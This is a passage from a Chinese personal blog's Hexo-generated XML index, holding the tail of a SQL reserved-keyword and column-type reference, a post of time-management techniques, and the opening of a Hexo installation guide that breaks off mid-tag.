class="hljs-keyword">BY</span>CCACHE<span class="hljs-keyword">CALL</span><span class="hljs-keyword">CALLED</span><span class="hljs-keyword">CARDINALITY</span>CASCADE<span class="hljs-keyword">CASCADED</span><span class="hljs-keyword">CASE</span>CASTCATALOGCATALOG_NAMECEILCEILINGCHAINCHANGE<span class="hljs-type">CHAR</span><span class="hljs-keyword">CHAR_LENGTH</span><span class="hljs-type">CHARACTER</span><span class="hljs-keyword">CHARACTER_LENGTH</span>CHARACTER_SET_CATALOGCHARACTER_SET_NAMECHARACTER_SET_SCHEMACHARACTERISTICSCHARACTERS<span class="hljs-keyword">CHECK</span>CHECKEDCHECKPOINTCHECKSUMCLASSCLASS_ORIGIN<span class="hljs-type">CLOB</span><span class="hljs-keyword">CLOSE</span>CLUSTERCLUSTEREDCOALESCECOBOL<span class="hljs-keyword">COLLATE</span><span class="hljs-keyword">COLLATION</span>COLLATION_CATALOGCOLLATION_NAMECOLLATION_SCHEMA<span class="hljs-keyword">COLLECT</span><span class="hljs-keyword">COLUMN</span>COLUMN_NAMECOLUMNSCOMMAND_FUNCTIONCOMMAND_FUNCTION_CODECOMMENT<span class="hljs-keyword">COMMIT</span>COMMITTEDCOMPLETIONCOMPRESSCOMPUTE<span class="hljs-keyword">CONDITION</span>CONDITION_NUMBER<span class="hljs-keyword">CONNECT</span>CONNECTIONCONNECTION_NAME<span class="hljs-keyword">CONSTRAINT</span>CONSTRAINT_CATALOGCONSTRAINT_NAMECONSTRAINT_SCHEMACONSTRAINTSCONSTRUCTOR<span class="hljs-keyword">CONTAINS</span>CONTAINSTABLECONTINUECONVERSION<span class="hljs-keyword">CONVERT</span><span class="hljs-keyword">COPY</span>CORR<span class="hljs-keyword">CORRESPONDING</span>COUNTCOVAR_POPCOVAR_SAMP<span class="hljs-keyword">CREATE</span>CREATEDBCREATEROLECREATEUSER<span class="hljs-keyword">CROSS</span>CSV<span class="hljs-keyword">CUBE</span>CUME_DIST<span class="hljs-keyword">CURRENT</span><span class="hljs-built_in">CURRENT_DATE</span><span class="hljs-built_in">CURRENT_DEFAULT_TRANSFORM_GROUP</span><span class="hljs-built_in">CURRENT_PATH</span><span class="hljs-built_in">CURRENT_ROLE</span><span class="hljs-built_in">CURRENT_TIME</span><span class="hljs-built_in">CURRENT_TIMESTAMP</span><span class="hljs-built_in">CURRENT_TRANSFORM_GROUP_FOR_TYPE</span><span class="hljs-built_in">CURRENT_USER</span><span class="hljs-keyword">CURSOR</span>CURSOR_NAME<span class="hljs-keyword">CYCLE</span>DATADATABASEDATABASES<span class="hljs-type">DATE</span>DATETIMEDATETIME_INTERVAL_CODEDATETIME_INTERVAL_PRECISION<span class="hljs-keyword">DAY</span>DAY_HOURDAY_MICROSECONDDAY_MINUTEDAY_SECONDDAYOFMONTHDAYOFWEEKDAYOFYEARDBCC<span class="hljs-keyword">DEALLOCATE</span><span class="hljs-type">DEC</span><span class="hljs-type">DECIMAL</span><span class="hljs-keyword">DECLARE</span><span class="hljs-keyword">DEFAULT</span>DEFAULTSDEFERRABLEDEFERREDDEFINEDDEFINERDEGREEDELAY_KEY_WRITEDELAYED<span class="hljs-keyword">DELETE</span>DELIMITERDELIMITERSDENSE_RANKDENYDEPTHDEREFDERIVED<span class="hljs-keyword">DESC</span><span class="hljs-keyword">DESCRIBE</span>DESCRIPTORDESTROYDESTRUCTOR<span class="hljs-keyword">DETERMINISTIC</span>DIAGNOSTICSDICTIONARYDISABLE<span class="hljs-keyword">DISCONNECT</span>DISKDISPATCH<span class="hljs-keyword">DISTINCT</span>DISTINCTROWDISTRIBUTEDDIVDODOMAIN<span class="hljs-keyword">DOUBLE</span><span class="hljs-keyword">DROP</span>DUALDUMMYDUMP<span class="hljs-keyword">DYNAMIC</span>DYNAMIC_FUNCTIONDYNAMIC_FUNCTION_CODE<span class="hljs-keyword">EACH</span>ELEMENT<span class="hljs-keyword">ELSE</span>ELSEIFENABLEENCLOSEDENCODINGENCRYPTED<span class="hljs-keyword">END</span><span class="hljs-keyword">END</span><span class="hljs-operator">-</span><span class="hljs-keyword">EXEC</span>ENUM<span class="hljs-keyword">EQUALS</span>ERRLVL<span class="hljs-keyword">ESCAPE</span>ESCAPED<span class="hljs-keyword">EVERY</span><span class="hljs-keyword">EXCEPT</span>EXCEPTIONEXCLUDEEXCLUDINGEXCLUSIVE<span class="hljs-keyword">EXEC</span><span class="hljs-keyword">EXECUTE</span>EXISTING<span class="hljs-keyword">EXISTS</span>EXITEXPEXPLAIN<span class="hljs-keyword">EXTERNAL</span>EXTRACT<span class="hljs-literal">FALSE</span><span class="hljs-keyword">FETCH</span>FIELDSFILEFILLFACTOR<span class="hljs-keyword">FILTER</span><span class="hljs-keyword">FINAL</span><span class="hljs-keyword">FIRST</span><span class="hljs-type">FLOAT</span>FLOAT4FLOAT8FLOORFLUSHFOLLOWING<span class="hljs-keyword">FOR</span>FORCE<span class="hljs-keyword">FOREIGN</span>FORTRANFORWARDFOUND<span class="hljs-keyword">FREE</span>FREETEXTFREETEXTTABLEFREEZE<span class="hljs-keyword">FROM</span><span class="hljs-keyword">FULL</span>FULLTEXT<span class="hljs-keyword">FUNCTION</span><span class="hljs-keyword">FUSION</span>GGENERALGENERATED<span class="hljs-keyword">GET</span><span class="hljs-keyword">GLOBAL</span>GOGOTO<span class="hljs-keyword">GRANT</span>GRANTEDGRANTSGREATEST<span class="hljs-keyword">GROUP</span><span class="hljs-keyword">GROUPING</span>HANDLER<span class="hljs-keyword">HAVING</span>HEADERHEAPHIERARCHYHIGH_PRIORITY<span class="hljs-keyword">HOLD</span>HOLDLOCKHOSTHOSTS<span class="hljs-keyword">HOUR</span>HOUR_MICROSECONDHOUR_MINUTEHOUR_SECONDIDENTIFIED<span class="hljs-keyword">IDENTITY</span>IDENTITY_INSERTIDENTITYCOLIFIGNOREILIKEIMMEDIATEIMMUTABLEIMPLEMENTATIONIMPLICIT<span class="hljs-keyword">IN</span>INCLUDEINCLUDINGINCREMENTINDEX<span class="hljs-keyword">INDICATOR</span>INFILEINFIXINHERITINHERITS<span class="hljs-keyword">INITIAL</span>INITIALIZEINITIALLY<span class="hljs-keyword">INNER</span><span class="hljs-keyword">INOUT</span>INPUT<span class="hljs-keyword">INSENSITIVE</span><span class="hljs-keyword">INSERT</span>INSERT_IDINSTANCEINSTANTIABLEINSTEAD<span class="hljs-type">INT</span>INT1INT2INT3INT4INT8<span class="hljs-type">INTEGER</span><span class="hljs-keyword">INTERSECT</span><span class="hljs-keyword">INTERSECTION</span><span class="hljs-type">INTERVAL</span><span class="hljs-keyword">INTO</span>INVOKER<span class="hljs-keyword">IS</span>ISAMISNULLISOLATIONITERATE<span class="hljs-keyword">JOIN</span>KKEYKEY_MEMBERKEY_TYPEKEYSKILLLANCOMPILER<span class="hljs-keyword">LANGUAGE</span><span class="hljs-keyword">LARGE</span><span class="hljs-keyword">LAST</span>LAST_INSERT_ID<span class="hljs-keyword">LATERAL</span><span class="hljs-keyword">LEADING</span>LEASTLEAVE<span class="hljs-keyword">LEFT</span>LENGTHLESSLEVEL<span class="hljs-keyword">LIKE</span>LIMITLINENOLINESLISTENLNLOAD<span class="hljs-keyword">LOCAL</span><span class="hljs-built_in">LOCALTIME</span><span class="hljs-built_in">LOCALTIMESTAMP</span>LOCATIONLOCATORLOCKLOGINLOGSLONGLONGBLOBLONGTEXTLOOPLOW_PRIORITYLOWERMMAP<span class="hljs-keyword">MATCH</span>MATCHEDMAXMAX_ROWSMAXEXTENTSMAXVALUEMEDIUMBLOBMEDIUMINTMEDIUMTEXT<span class="hljs-keyword">MEMBER</span><span class="hljs-keyword">MERGE</span>MESSAGE_LENGTHMESSAGE_OCTET_LENGTHMESSAGE_TEXT<span class="hljs-keyword">METHOD</span>MIDDLEINTMINMIN_ROWSMINUS<span class="hljs-keyword">MINUTE</span>MINUTE_MICROSECONDMINUTE_SECONDMINVALUEMLSLABELMODMODE<span class="hljs-keyword">MODIFIES</span>MODIFY<span class="hljs-keyword">MODULE</span><span class="hljs-keyword">MONTH</span>MONTHNAMEMOREMOVE<span class="hljs-keyword">MULTISET</span>MUMPSMYISAMNAMENAMES<span class="hljs-type">NATIONAL</span><span class="hljs-keyword">NATURAL</span><span class="hljs-type">NCHAR</span><span class="hljs-type">NCLOB</span>NESTING<span class="hljs-keyword">NEW</span>NEXT<span class="hljs-keyword">NO</span>NO_WRITE_TO_BINLOGNOAUDITNOCHECKNOCOMPRESSNOCREATEDBNOCREATEROLENOCREATEUSERNOINHERITNOLOGINNONCLUSTERED<span class="hljs-keyword">NONE</span><span class="hljs-keyword">NORMALIZE</span>NORMALIZEDNOSUPERUSER<span class="hljs-keyword">NOT</span>NOTHINGNOTIFYNOTNULLNOWAIT<span class="hljs-keyword">NULL</span>NULLABLENULLIFNULLSNUMBER<span class="hljs-type">NUMERIC</span>OBJECT<span class="hljs-keyword">OCTET_LENGTH</span>OCTETS<span class="hljs-keyword">OF</span>OFFOFFLINE<span class="hljs-keyword">OFFSET</span>OFFSETSOIDS<span class="hljs-keyword">OLD</span><span class="hljs-keyword">ON</span>ONLINE<span class="hljs-keyword">ONLY</span><span class="hljs-keyword">OPEN</span>OPENDATASOURCEOPENQUERYOPENROWSETOPENXMLOPERATIONOPERATOROPTIMIZEOPTIONOPTIONALLYOPTIONS<span class="hljs-keyword">OR</span><span class="hljs-keyword">ORDER</span>ORDERINGORDINALITYOTHERS<span class="hljs-keyword">OUT</span><span class="hljs-keyword">OUTER</span>OUTFILEOUTPUT<span class="hljs-keyword">OVER</span><span class="hljs-keyword">OVERLAPS</span><span class="hljs-keyword">OVERLAY</span>OVERRIDINGOWNERPACK_KEYSPAD<span class="hljs-keyword">PARAMETER</span>PARAMETER_MODEPARAMETER_NAMEPARAMETER_ORDINAL_POSITIONPARAMETER_SPECIFIC_CATALOGPARAMETER_SPECIFIC_NAMEPARAMETER_SPECIFIC_SCHEMAPARAMETERSPARTIAL<span class="hljs-keyword">PARTITION</span>PASCALPASSWORDPATHPCTFREE<span class="hljs-keyword">PERCENT</span>PERCENT_RANKPERCENTILE_CONTPERCENTILE_DISCPLACINGPLANPLIPOSITIONPOSTFIXPOWERPRECEDING<span class="hljs-keyword">PRECISION</span>PREFIXPREORDER<span class="hljs-keyword">PREPARE</span>PREPAREDPRESERVE<span class="hljs-keyword">PRIMARY</span>PRINTPRIORPRIVILEGESPROCPROCEDURAL<span class="hljs-keyword">PROCEDURE</span>PROCESSPROCESSLISTPUBLICPURGEQUOTERAID0RAISERROR<span class="hljs-keyword">RANGE</span>RANKRAWREAD<span class="hljs-keyword">READS</span>READTEXT<span class="hljs-type">REAL</span>RECHECKRECONFIGURE<span class="hljs-keyword">RECURSIVE</span><span class="hljs-keyword">REF</span><span class="hljs-keyword">REFERENCES</span><span class="hljs-keyword">REFERENCING</span>REGEXPREGR_AVGXREGR_AVGYREGR_COUNTREGR_INTERCEPTREGR_R2REGR_SLOPEREGR_SXXREGR_SXYREGR_SYYREINDEXRELATIVE<span class="hljs-keyword">RELEASE</span>RELOADRENAMEREPEATREPEATABLEREPLACEREPLICATIONREQUIRERESETRESIGNALRESOURCERESTARTRESTORERESTRICT<span class="hljs-keyword">RESULT</span><span class="hljs-keyword">RETURN</span>RETURNED_CARDINALITYRETURNED_LENGTHRETURNED_OCTET_LENGTHRETURNED_SQLSTATE<span class="hljs-keyword">RETURNS</span><span class="hljs-keyword">REVOKE</span><span class="hljs-keyword">RIGHT</span>RLIKEROLE<span class="hljs-keyword">ROLLBACK</span><span class="hljs-keyword">ROLLUP</span>ROUTINEROUTINE_CATALOGROUTINE_NAMEROUTINE_SCHEMA<span class="hljs-type">ROW</span>ROW_COUNTROW_NUMBERROWCOUNTROWGUIDCOLROWIDROWNUM<span class="hljs-keyword">ROWS</span>RULESAVE<span class="hljs-keyword">SAVEPOINT</span>SCALESCHEMASCHEMA_NAMESCHEMAS<span class="hljs-keyword">SCOPE</span>SCOPE_CATALOGSCOPE_NAMESCOPE_SCHEMA<span class="hljs-keyword">SCROLL</span><span class="hljs-keyword">SEARCH</span><span class="hljs-keyword">SECOND</span>SECOND_MICROSECONDSECTIONSECURITY<span class="hljs-keyword">SELECT</span>SELF<span class="hljs-keyword">SENSITIVE</span>SEPARATORSEQUENCESERIALIZABLESERVER_NAMESESSION<span class="hljs-built_in">SESSION_USER</span><span class="hljs-keyword">SET</span>SETOFSETSSETUSERSHARE<span class="hljs-keyword">SHOW</span>SHUTDOWNSIGNAL<span class="hljs-keyword">SIMILAR</span>SIMPLESIZE<span class="hljs-type">SMALLINT</span><span class="hljs-keyword">SOME</span>SONAMESOURCESPACESPATIAL<span class="hljs-keyword">SPECIFIC</span>SPECIFIC_NAME<span class="hljs-keyword">SPECIFICTYPE</span><span class="hljs-keyword">SQL</span>SQL_BIG_RESULTSQL_BIG_SELECTSSQL_BIG_TABLESSQL_CALC_FOUND_ROWSSQL_LOG_OFFSQL_LOG_UPDATESQL_LOW_PRIORITY_UPDATESSQL_SELECT_LIMITSQL_SMALL_RESULTSQL_WARNINGSSQLCASQLCODESQLERROR<span class="hljs-keyword">SQLEXCEPTION</span><span class="hljs-keyword">SQLSTATE</span><span class="hljs-keyword">SQLWARNING</span>SQRTSSLSTABLE<span class="hljs-keyword">START</span>STARTINGSTATESTATEMENT<span class="hljs-keyword">STATIC</span>STATISTICSSTATUSSTDDEV_POPSTDDEV_SAMPSTDINSTDOUTSTORAGESTRAIGHT_JOINSTRICTSTRINGSTRUCTURESTYLESUBCLASS_ORIGINSUBLIST<span class="hljs-keyword">SUBMULTISET</span>SUBSTRINGSUCCESSFULSUMSUPERUSER<span class="hljs-keyword">SYMMETRIC</span>SYNONYMSYSDATESYSID<span class="hljs-keyword">SYSTEM</span><span class="hljs-built_in">SYSTEM_USER</span><span class="hljs-keyword">TABLE</span>TABLE_NAMETABLES<span class="hljs-keyword">TABLESAMPLE</span>TABLESPACETEMPTEMPLATETEMPORARYTERMINATETERMINATEDTEXTTEXTSIZETHAN<span class="hljs-keyword">THEN</span>TIES<span class="hljs-type">TIME</span><span class="hljs-type">TIMESTAMP</span><span class="hljs-keyword">TIMEZONE_HOUR</span><span class="hljs-keyword">TIMEZONE_MINUTE</span>TINYBLOBTINYINTTINYTEXT<span class="hljs-keyword">TO</span>TOASTTOPTOP_LEVEL_COUNT<span class="hljs-keyword">TRAILING</span>TRANTRANSACTIONTRANSACTION_ACTIVETRANSACTIONS_COMMITTEDTRANSACTIONS_ROLLED_BACKTRANSFORMTRANSFORMSTRANSLATE<span class="hljs-keyword">TRANSLATION</span>TREAT<span class="hljs-keyword">TRIGGER</span>TRIGGER_CATALOGTRIGGER_NAMETRIGGER_SCHEMATRIM<span class="hljs-literal">TRUE</span><span class="hljs-keyword">TRUNCATE</span>TRUSTEDTSEQUALTYPE<span class="hljs-keyword">UESCAPE</span>UIDUNBOUNDEDUNCOMMITTEDUNDERUNDOUNENCRYPTED<span class="hljs-keyword">UNION</span><span class="hljs-keyword">UNIQUE</span><span class="hljs-literal">UNKNOWN</span>UNLISTENUNLOCKUNNAMEDUNNESTUNSIGNEDUNTIL<span class="hljs-keyword">UPDATE</span>UPDATETEXTUPPERUSAGEUSE<span class="hljs-keyword">USER</span>USER_DEFINED_TYPE_CATALOGUSER_DEFINED_TYPE_CODEUSER_DEFINED_TYPE_NAMEUSER_DEFINED_TYPE_SCHEMA<span class="hljs-keyword">USING</span>UTC_DATEUTC_TIMEUTC_TIMESTAMPVACUUMVALIDVALIDATEVALIDATOR<span class="hljs-keyword">VALUE</span><span class="hljs-keyword">VALUES</span>VAR_POPVAR_SAMP<span class="hljs-type">VARBINARY</span><span class="hljs-type">VARCHAR</span>VARCHAR2VARCHARACTERVARIABLEVARIABLES<span class="hljs-type">VARYING</span>VERBOSE<span class="hljs-keyword">VIEW</span>VOLATILEWAITFOR<span class="hljs-keyword">WHEN</span><span class="hljs-keyword">WHENEVER</span><span class="hljs-keyword">WHERE</span>WHILEWIDTH_BUCKET<span class="hljs-keyword">WINDOW</span><span class="hljs-keyword">WITH</span><span class="hljs-keyword">WITHIN</span><span class="hljs-keyword">WITHOUT</span>WORKWRITEWRITETEXTX509XOR<span class="hljs-keyword">YEAR</span>YEAR_MONTHZEROFILLZONE<span class="hljs-keyword">language</span><span class="hljs-operator">-</span><span class="hljs-keyword">sql</span>复制代码</code></pre><h3 id="Column-data-types-列的数据类型"><a href="#Column-data-types-列的数据类型" class="headerlink" title="Column data types 列的数据类型"></a>Column data types 列的数据类型</h3><p>出于在数据库引擎之间达到最大程度兼容的目的，下面是一些建议使用的列数据类型。</p><h4 id="Character-types-字符型"><a href="#Character-types-字符型" class="headerlink" title="Character types 字符型"></a>Character types 字符型</h4><ul><li>CHAR</li><li>CLOB</li><li>VARCHAR</li></ul><h4 id="Numeric-types-数值型"><a href="#Numeric-types-数值型" class="headerlink" title="Numeric types 数值型"></a>Numeric types 数值型</h4><ul><li>精确数值类型<ul><li>BIGINT</li><li>DECIMAL</li><li>DECFLOAT</li><li>INTEGER</li><li>NUMERIC</li><li>SMALLINT</li></ul></li><li>近似数值类型<ul><li>DOUBLE PRECISION</li><li>FLOAT</li><li>REAL</li></ul></li></ul><h4 id="Datetime-types-日期时间类型"><a href="#Datetime-types-日期时间类型" class="headerlink" title="Datetime types 日期时间类型"></a>Datetime types 日期时间类型</h4><ul><li>DATE</li><li>TIME</li><li>TIMESTAMP</li></ul><h4 id="Binary-types-二进制类型"><a href="#Binary-types-二进制类型" class="headerlink" title="Binary types 二进制类型"></a>Binary types 二进制类型</h4><ul><li>BINARY</li><li>BLOB</li><li>VARBINARY</li></ul><h4 id="Additional-types-其他类型"><a href="#Additional-types-其他类型" class="headerlink" title="Additional types 其他类型"></a>Additional types 其他类型</h4><ul><li>Boolean</li><li>INTERVAL</li><li>XML</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>时间管理</title>
      <link href="/2021/03/14/%E6%97%B6%E9%97%B4%E7%AE%A1%E7%90%86/"/>
      <url>/2021/03/14/%E6%97%B6%E9%97%B4%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="01-目标"><a href="#01-目标" class="headerlink" title="01 目标"></a>01 目标</h2><ol><li>如何有效的安排每一天的时间？</li><li>如何全面管理每一个日常事务？</li><li>如何开始和坚持每一件事情？</li></ol><h2 id="02-要事管理"><a href="#02-要事管理" class="headerlink" title="02 要事管理"></a>02 要事管理</h2><ol><li>随手记: 每一天，任何时候，只要你想到有件事情可能因该做，你就应该立刻把它纳入到你的清单里。</li><li>待处理清单: 待处理清单不一定都需要做的，应该时常去看你的待处理清单，并思考每一件事情，做出筛选。</li><li>72 小时法则: 用于筛选待处理清单。逐项思考每一件你随手记下来的事情；问自己今天、明天、后天我是否打算花时间去做这件事；如果答案是“否”，立刻删掉这件事；如果答案是“是”，想想具体你都要做什么</li><li>状态优先法: 用最适合的状态去做最适合的事情。如果自己现在状态较好，可以挑哪些有难度的事情试试看；如果你意识到此刻状态不佳，就可以去找清单上简单易上手的事情做一做，获得成就感，使你状态上升</li></ol><p><img src="https://gitee.com/hjxstart/images/raw/master/2022/%E6%97%B6%E9%97%B4%E7%AE%A1%E7%90%86__02%E8%A6%81%E4%BA%8B%E7%AE%A1%E7%90%86.png" alt="要事管理"></p><p>要事管理</p><hr><h2 id="04-养成坏习惯"><a href="#04-养成坏习惯" class="headerlink" title="04 养成坏习惯"></a>04 养成坏习惯</h2><p><strong>不怕坏习惯，怕坏习惯失控。</strong></p><ol><li>使用场景：不容易停下来；不能切底戒掉。</li><li>具体方法：为坏习惯安排出特定时间；把坏习惯当作完成任务的奖励。</li><li>控制剂量：每天或每周安排出时间；监控自己是否过量。</li><li>无聊是根本问题：优先解决无聊问题；用好习惯充实生活。</li><li>注意事项：和平共处；练习停止；像培养好习惯一样对待。</li></ol><hr><h2 id="05-倒逼法"><a href="#05-倒逼法" class="headerlink" title="05 倒逼法"></a>05 倒逼法</h2><p><strong>人的成长要靠倒逼</strong></p><ol><li>早睡的动力：晚醒会影响精神状态；长期晚睡会影响到身体健康。</li><li>倒逼入睡的方法：让自己没有余地，没有妥协可能性；Wake 闹钟的设置。</li><li>问题：通常情况下我们有一个任务。我们手头的事情通常情况下都比这个要长，也许我们有 100 天的时间，也就是说截止日期是在一百天后。多数人是前 90 天没有认真作事情，最后十天突击，专心在做事情。</li><li>规则：在目标日期之后，绝对不花时间来做这件事情（目标日期不是截止日期）</li><li>突破自己：远离自己的舒适圈</li></ol><hr><h2 id="06-具象法"><a href="#06-具象法" class="headerlink" title="06 具象法"></a>06 具象法</h2><p><strong>坚持自上而下的改变</strong></p><ol><li>自上而下：观念上的改变。</li><li>自下而上：行为上的变化。</li><li>不同角度：情绪；认知；行为。、</li><li>感受一下：向前一小步，文明一大步。</li><li>分析：时间管理不是励志，不是鸡汤；时间管理是非常具体的。</li></ol><hr><h2 id="07-要事优先"><a href="#07-要事优先" class="headerlink" title="07 要事优先"></a>07 要事优先</h2><p><strong>只要是你打算作的事情，不管重不重要的事情</strong></p><ol><li>理念：在生活中最重要的是什么？为自己创建自由，具体表现；拥有你自己。</li><li>为自己创造财富：健康；资产；人际。</li></ol><hr><h2 id="08-五分钟清醒术"><a href="#08-五分钟清醒术" class="headerlink" title="08 五分钟清醒术"></a>08 五分钟清醒术</h2><p><strong>身体醒了大脑就跟着醒了</strong></p><ol><li>问题：起床后出现困倦感。</li><li>两个赖床阶段：躺在床上不想东；下了床想回去。</li><li>解决方法 1：手指脚趾动法。局部带动全身的原理。</li><li>解决方法 2：肠胃苏醒法。白开水带动肠胃苏醒。</li><li>其他补充方式：刷牙、洗脸、吃东西、活动身体和思考。</li></ol><hr><h2 id="09-20-80-法则"><a href="#09-20-80-法则" class="headerlink" title="09 20&#x2F;80 法则"></a>09 20&#x2F;80 法则</h2><p><strong>和时间管理没有半毛钱关系</strong></p><ol><li>没有捷径：如果你真的花了 20%的时间创造了 80%的价值，他并不代表你一定过好了，并不代表剩下的 80%的时间你就可以什么都不做了；思考一下自己最重要的哪些价值应该在什么时间产出；抓大放小，而不是面面俱到。</li><li>一天之际：你一天当中最精华的 2 到 4 个小时的时间是在那段？</li><li>关键任务：认清自己最重要的任务有哪些？</li><li>基础习惯：你的日常习惯当中哪些是最基础最重要的？<br><strong>用量</strong></li><li>时间：每月或每季度一次，通常是自己的时间规律发生变化时才有必要重新思考。</li><li>任务：每日、每周、每月或每年思考，根据实际需要的频次来决定。</li><li>习惯：根据自己的习惯养成情况决定，一项重点习惯养成，再重新调整。</li><li>注意事项：20&#x2F;80 是指导原则；20&#x2F;80 比例仅供参考；必须找到衡量标准。</li></ol><hr><h2 id="10-三条命坚持法"><a href="#10-三条命坚持法" class="headerlink" title="10 三条命坚持法"></a>10 三条命坚持法</h2><p><strong>坚持，没有名怎么行？</strong></p><ol><li>什么时候应用：每天都要坚持做一件事。</li><li>原因：每天能做的事情有限；无聊做什么很难做到每天做到每天都一样。</li><li>为什么要用三条命坚持法：重点是帮助你坚持。</li><li>设定周目标：七天当中几天做到；推荐四天；MAC：最小有成就感的改变。</li></ol><hr><h2 id="11-沐浴自控法"><a href="#11-沐浴自控法" class="headerlink" title="11 沐浴自控法"></a>11 沐浴自控法</h2><p><strong>用洗澡来锻炼自己的自控力</strong></p><ol><li>问题：晚间停不下来；原因是陷入来刺激中，刺激一旦开始，我们很难脱离出来。</li><li>解决方法：更早的时间；思路是在我们还未陷入到刺激当中，原理刺激。</li><li>沐浴自控法：洗完澡之后，就可以开始下一个读书学习活动。</li><li>如何操作：睡前 1.5 小时洗澡。</li></ol><hr><h2 id="12-晚间二分法"><a href="#12-晚间二分法" class="headerlink" title="12 晚间二分法"></a>12 晚间二分法</h2><p><strong>放松休闲，充电提升，而不是耽误</strong></p><ol><li>晚间时光如何利用：晚间的需求（娱乐休闲，提升充电）；困难和障碍（娱乐休闲停不下来，提升充电学不进去）。</li><li>两种需求都应该被满足：晚上的时间一分为二。</li><li>有安排玩的痛快：为刷手机安排出时间。</li><li>分界线：以洗澡为界，分成两个部分。</li><li>睡前学习提神：读书学习，准备第二天，放松。</li></ol><hr><h2 id="13-三只青蛙法"><a href="#13-三只青蛙法" class="headerlink" title="13 三只青蛙法"></a>13 三只青蛙法</h2><p><strong>练习自我承诺和兑现承诺</strong></p><ol><li>关键问题：今天你最重要的一件事情是什么？</li><li>青蛙的条件：自我要求而非外部约定；完成之后的轻松感和成就感。</li><li>只有一件：过程，逐渐增加保持的状态。</li><li>练习的内容：自我控制的能力，每天规划一个重点，每天搞定一个重点。</li></ol><hr><h2 id="14-随手记"><a href="#14-随手记" class="headerlink" title="14 随手记"></a>14 随手记</h2><p><strong>贵人多忘事，只因记心中</strong></p><ol><li>当想法出现在大脑里：否定；忽略；遗忘；压抑。</li><li>灵光一闪：记录下来，在合适的时间进行推进。</li><li>随手记的方法：What：想法；When：立刻；Where：纸或手机；How：最简单的文字。</li><li>时间管理者的标志-随手记：时间管理者能有意志的管理自己；水平越高的人随手记的数量越多。</li></ol><hr><h2 id="15-状态优先法"><a href="#15-状态优先法" class="headerlink" title="15 状态优先法"></a>15 状态优先法</h2><p><strong>通过做任务来调节自己的状态</strong></p><ol><li>状态时好时坏：状态好的时候，什么都能做到；状态不好的时候，什么都不想做。</li><li>状态好的时候可以选择一些任务困难一点的任务来做。</li></ol><hr><h2 id="16-蛋糕切分法"><a href="#16-蛋糕切分法" class="headerlink" title="16 蛋糕切分法"></a>16 蛋糕切分法</h2><p><strong>如何一步一步的搞定事情</strong></p><ol><li>危难情绪：焦虑 -&gt; 逃避。</li><li>如何改变：改变自己；改变任务；改变感知。</li><li>通过切分改变感知：仅仅关注下一步行动（有明确的结果，能在 30 分钟以内完成）。</li><li>核心思想：关注过程，而非结果。</li></ol><h2 id="17-Getting-Things-Done-GTD"><a href="#17-Getting-Things-Done-GTD" class="headerlink" title="17 Getting Things Done (GTD)"></a>17 Getting Things Done (GTD)</h2><p><strong>最系统全面的工作方法</strong></p><ol><li>适合人群：忙碌者严格执行。</li></ol><hr><h2 id="18-自然计划法"><a href="#18-自然计划法" class="headerlink" title="18 自然计划法"></a>18 自然计划法</h2><p><strong>通过有效思考来做计划，适合短期任务</strong></p><ol><li>自然计划过程：定义结果；头脑风暴；组织整理；心里预演。</li><li>定义结果：核心任务，搞清楚任务做成的想要样子，做到的程序，得到的结果。</li><li>头脑风暴：思考能够实现目标的手段。</li><li>组织步骤：按照先后顺序整理。</li><li>心里预演：畅想整个过程。</li></ol><hr><h2 id="19-72-小时原则"><a href="#19-72-小时原则" class="headerlink" title="19 72 小时原则"></a>19 72 小时原则</h2><p><strong>错过了时机不做也就不做了</strong></p><ol><li>理念出外：书名《小狗钱钱》</li><li>从想法到行动，各种拖延的可能；否定，自己扼杀一个想法；忽视，没有引起足够充实；压抑，选择性遗忘；遗忘，切底遗忘。</li><li>在 72 小时之内给想法找个归宿：下一步行动；提醒；留存；决定放弃。</li><li>注意：使用随手记工具。</li></ol><hr><h2 id="20-帕金森法"><a href="#20-帕金森法" class="headerlink" title="20 帕金森法"></a>20 帕金森法</h2><p><strong>比番茄工作法更实用</strong></p><ol><li>帕金森定律：当人只有有限的时间时，效率是比较高的。</li><li>提前预计时间花费：知道任务多长时间，实现执行任务的高效，单位为分钟。</li><li>执行任务准备倒计时时钟：增加你的紧迫感；预测任务的花费时间，在执行时计时。</li></ol><hr><h2 id="21-番茄工作法（不推荐）"><a href="#21-番茄工作法（不推荐）" class="headerlink" title="21 番茄工作法（不推荐）"></a>21 番茄工作法（不推荐）</h2><ol><li>如何应用：确定任务–做 25 分钟–休息 25 分钟；将任务按照时间推进。</li><li>蛋糕切分方法的变种：处理为难情绪；改变感知；从时间维度切分。</li><li>核心思想：把任务变的小一点，短一点，小一点。</li></ol><hr><h2 id="22-小红花法"><a href="#22-小红花法" class="headerlink" title="22 小红花法"></a>22 小红花法</h2><p><strong>用打卡激励自己坚持</strong></p><ol><li>方法简单之极：日历记录，当天是否做到这个习惯。</li><li>核心目的：通过对自己的习惯记录，把更多的精力关注和思考这个习惯，促使习惯的萌芽和坚持。</li></ol><hr><h2 id="23-结合健身法"><a href="#23-结合健身法" class="headerlink" title="23 结合健身法"></a>23 结合健身法</h2><p><strong>最好的健身是没觉得自己在健身</strong></p><ol><li>将运动建立在生活上：远足；园艺；修建围栏。</li><li></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo</title>
      <link href="/2021/03/14/Hexo/"/>
      <url>/2021/03/14/Hexo/</url>
      
        <content type="html"><![CDATA[<h3 id="1-node-环境搭建"><a href="#1-node-环境搭建" class="headerlink" title="1.node 环境搭建"></a>1.node 环境搭建</h3><pre><code class="hljs bash">node -v</code></pre><hr><h3 id="2-安装-hexo-cli"><a href="#2-安装-hexo-cli" class="headerlink" title="2.安装 hexo-cli"></a>2.安装 hexo-cli</h3><pre><code class="hljs bash">cnpm install -g hexo-cli</code></pre><hr><h3 id="3-文件夹下初始化博客"><a href="#3-文件夹下初始化博客" class="headerlink" title="3.文件夹下初始化博客"></a>3.文件夹下初始化博客</h3><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> hexo init</code></pre><hr><h3 id="4-创建一篇新文章"><a href="#4-创建一篇新文章" class="headerlink" title="4.创建一篇新文章"></a>4.创建一篇新文章</h3><pre><code class="hljs bash">hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre><hr><h3 id="5-本地运行预览"><a href="#5-本地运行预览" class="headerlink" 